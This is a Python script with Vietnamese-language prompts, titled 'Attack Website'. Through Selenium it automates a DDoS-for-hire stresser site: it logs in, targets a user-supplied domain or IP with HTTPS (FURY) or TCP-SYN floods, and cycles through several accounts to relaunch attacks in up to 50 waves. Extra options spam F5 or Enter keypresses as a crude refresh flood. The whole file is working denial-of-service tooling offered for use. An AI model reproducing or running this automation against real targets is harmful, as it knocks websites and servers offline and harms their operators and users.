from selenium import webdriver
from selenium.webdriver.support.ui import Select
import time
import keyboard
import os,sys
print ("")
print (" Attack Website By Nguyễn Nghị")
print ("""
    1.DDoS Layer 7
    2.DDoS Layer 4
    3.Auto F5
    4.Auto Enter
    """)
ans=True
while ans:
  ans=input(" Vui Lòng Nhập Số Từ 1-4 (Mặc Định 1): ") 
  if ans=="1": 
    os.system("cls")
    print('                         DDoS Layer 7')
    time.sleep(3)
    domain=input("   Nhập Domain: ")
    ipl7=input("   Nhập IP (Nếu Có): ")
    userl7=input("   Tài Khoản: ")
    pasl7=input("   Mật Khẩu: ")
    options=webdriver.ChromeOptions()
    options.add_argument("--incognito")
    options.add_argument("--headless")
    options.add_argument("start-maximized")
    driver=webdriver.Chrome(options=options)
    driver.get('https://cryptostresser.com/login')
    time.sleep(1) 
    driver.find_element_by_id('username').send_keys(f"{userl7}1")
    time.sleep(1)
    driver.find_element_by_id('password').send_keys(f"{pasl7}")
    time.sleep(1)
    driver.find_element_by_id('login_button').click()
    time.sleep(1)
    driver.find_element_by_class_name('user-img-radious-style').click()
    time.sleep(2)
    driver.find_element_by_link_text('Attack Panel').click()
    a=0
    while True:
     time.sleep(2)
     driver.find_element_by_id('attack_target').send_keys(f"https://{domain}")
     time.sleep(1)
     select = Select(driver.find_element_by_id('attack_methods'))
     select.select_by_visible_text('[FREE] HTTPS (FURY)')
     time.sleep(1)
     driver.find_element_by_id('send_attack_button').click()
     time.sleep(2)
     driver.find_element_by_class_name('swal-button-container').click()
     time.sleep(1)
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Logout').click()
     time.sleep(1)
     driver.refresh()
     driver.find_element_by_id('username').send_keys(f"{userl7}2")
     time.sleep(1)
     driver.find_element_by_id('password').send_keys(f"{pasl7}")
     time.sleep(1)
     driver.find_element_by_id('login_button').click()
     time.sleep(1)
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Attack Panel').click()
     time.sleep(2)
     driver.find_element_by_id('attack_target').send_keys(f"https://{ipl7}")
     time.sleep(1)
     select = Select(driver.find_element_by_id('attack_methods'))
     select.select_by_visible_text('[FREE] HTTPS (FURY)')
     time.sleep(1)
     driver.find_element_by_id('send_attack_button').click()
     time.sleep(2)
     driver.find_element_by_class_name('swal-button-container').click()
     time.sleep(1)
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Logout').click()
     time.sleep(2)
     driver.find_element_by_id('username').send_keys(f"{userl7}1")
     time.sleep(1)
     driver.find_element_by_id('password').send_keys(f"{pasl7}")
     time.sleep(1)
     driver.find_element_by_id('login_button').click()
     time.sleep(1)
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Attack Panel').click()
     os.system("cls")
     a=a+1
     for i in range(265,0,-1):
       os.system("cls")
       print(f" Đang Tấn Công Website: {domain}, Đợt Tấn Công Thứ {a} Kết Thúc Sau: {i}", end="\r", flush=True)
       time.sleep(1)
     if a == 50:
       break
     else:
      os.system("cls")
      print(f' Kết Thúc Đợt Tấn Công Thứ {a} !')
      print(' Đang Setup Đợt Tấn Công Tiếp Theo...') 
  elif ans=="2":
    os.system("cls")
    print('                         DDoS Layer 4')
    time.sleep(3)
    ipl4=input("   Nhập IP: ")
    userl4=input("   Tài Khoản: ")
    pasl4=input("   Mật Khẩu: ")
    options=webdriver.ChromeOptions()
    options.add_argument("--incognito")
    options.add_argument("--headless")
    options.add_argument("start-maximized")
    driver=webdriver.Chrome(options=options)
    driver.get('https://cryptostresser.com/login')
    time.sleep(1) 
    driver.find_element_by_id('username').send_keys(f"{userl4}3")
    time.sleep(1)
    driver.find_element_by_id('password').send_keys(f"{pasl4}")
    time.sleep(1)
    driver.find_element_by_id('login_button').click()
    time.sleep(1)
    driver.find_element_by_class_name('user-img-radious-style').click()
    time.sleep(2)
    driver.find_element_by_link_text('Attack Panel').click()
    b=0
    while True:
     time.sleep(2)
     driver.find_element_by_id('attack_target').send_keys(f"{ipl4}")
     time.sleep(1)
     select = Select(driver.find_element_by_id('attack_methods'))
     select.select_by_visible_text('[FREE] TCP-SYN')
     time.sleep(1)
     driver.find_element_by_id('send_attack_button').click()
     time.sleep(2)
     driver.find_element_by_class_name('swal-button-container').click()
     time.sleep(1)
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Logout').click()
     time.sleep(1)
     driver.refresh()
     driver.find_element_by_id('username').send_keys(f"{userl4}3")
     time.sleep(1)
     driver.find_element_by_id('password').send_keys(f"{pasl4}")
     time.sleep(1)
     driver.find_element_by_id('login_button').click()
     time.sleep(1)
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Attack Panel').click()
     os.system("cls")
     b=b+1
     for i in range(285,0,-1):
       os.system("cls")
       print(f" Đang Tấn Công IP: {ipl4}, Đợt Tấn Công Thứ {b} Kết Thúc Sau: {i}", end="\r", flush=True)
       time.sleep(1)
     if b == 50:
      break 
     else:
      os.system("cls")
      print(f' Kết Thúc Đợt Tấn Công Thứ {b} !')
      print(' Đang Setup Đợt Tấn Công Tiếp Theo...') 
  elif ans=="3":
    abc=True
    while abc:
     abc=input(" Bạn Có 5s Để Lựa Chọn Mục Tiêu, Bạn Đã Sẵn Sàn Chưa? y/n (Mặc Định n) :") 
     if abc=="y":
      for i in range(5,0,-1):
        print(f" Auto F5 Bắt Đầu Sau: {i}", end="\r", flush=True)
        time.sleep(1)
      os.system("cls")
      c=0
      while True:
       keyboard.press_and_release("f5")
       c=c+1
       print(f" Số Lần F5: {c}", end="\r", flush=True)
       time.sleep(0.05)
     elif abc !="y":
      break
     break 
  elif ans=="4":
    xyz=True
    while xyz:
     xyz=input(" Bạn Có 5s Để Lựa Chọn Mục Tiêu, Bạn Đã Sẵn Sàn Chưa? y/n (Mặc Định n) :") 
     if xyz=="y":
      for i in range(5,0,-1):
        print(f" Auto Enter Bắt Đầu Sau: {i}", end="\r", flush=True)
        time.sleep(1)
      os.system("cls")
      d=0
      while True:
       keyboard.press_and_release("enter")
       d=d+1
       print(f" Số Lần Enter: {d}", end="\r", flush=True)
       time.sleep(0.05) 
  elif ans !="1,2,3,4":
    os.system("cls")
    print('                         DDoS Layer 7')
    time.sleep(3)
    domain=input("   Nhập Domain: ")
    ipl7=input("   Nhập IP (Nếu Có): ")
    userl7=input("   Tài Khoản: ")
    pasl7=input("   Mật Khẩu: ")
    options=webdriver.ChromeOptions()
    options.add_argument("--incognito")
    options.add_argument("--headless")
    options.add_argument("start-maximized")
    driver=webdriver.Chrome(options=options)
    driver.get('https://cryptostresser.com/login')
    time.sleep(1) 
    driver.find_element_by_id('username').send_keys(f"{userl7}1")
    time.sleep(1)
    driver.find_element_by_id('password').send_keys(f"{pasl7}")
    time.sleep(1)
    driver.find_element_by_id('login_button').click()
    time.sleep(1)
    driver.find_element_by_class_name('user-img-radious-style').click()
    time.sleep(2)
    driver.find_element_by_link_text('Attack Panel').click()
    e=0
    while True:
     time.sleep(2)
     driver.find_element_by_id('attack_target').send_keys(f"https://{domain}")
     time.sleep(1)
     select = Select(driver.find_element_by_id('attack_methods'))
     select.select_by_visible_text('[FREE] HTTPS (FURY)')
     time.sleep(1)
     driver.find_element_by_id('send_attack_button').click()
     time.sleep(2)
     driver.find_element_by_class_name('swal-button-container').click()
     time.sleep(1)
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Logout').click()
     time.sleep(1)
     driver.refresh()
     driver.find_element_by_id('username').send_keys(f"{userl7}2")
     time.sleep(1)
     driver.find_element_by_id('password').send_keys(f"{pasl7}")
     time.sleep(1)
     driver.find_element_by_id('login_button').click()
     time.sleep(1)
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Attack Panel').click()
     time.sleep(2)
     driver.find_element_by_id('attack_target').send_keys(f"https://{ipl7}")
     time.sleep(1)
     select = Select(driver.find_element_by_id('attack_methods'))
     select.select_by_visible_text('[FREE] HTTPS (FURY)')
     time.sleep(1)
     driver.find_element_by_id('send_attack_button').click()
     time.sleep(2)
     driver.find_element_by_class_name('swal-button-container').click()
     time.sleep(1)
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Logout').click()
     time.sleep(2)
     driver.find_element_by_id('username').send_keys(f"{userl7}1")
     time.sleep(1)
     driver.find_element_by_id('password').send_keys(f"{pasl7}")
     time.sleep(1)
     driver.find_element_by_id('login_button').click()
     time.sleep(1)
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Attack Panel').click()
     os.system("cls")
     e=e+1
     for i in range(265,0,-1):
       os.system("cls")
       print(f" Đang Tấn Công Website: {domain}, Đợt Tấn Công Thứ {e} Kết Thúc Sau: {i}", end="\r", flush=True)
       time.sleep(1)
     if e == 50:
       break
     else:
      os.system("cls")
      print(f' Kết Thúc Đợt Tấn Công Thứ {e} !')
      print(' Đang Setup Đợt Tấn Công Tiếp Theo...')
  break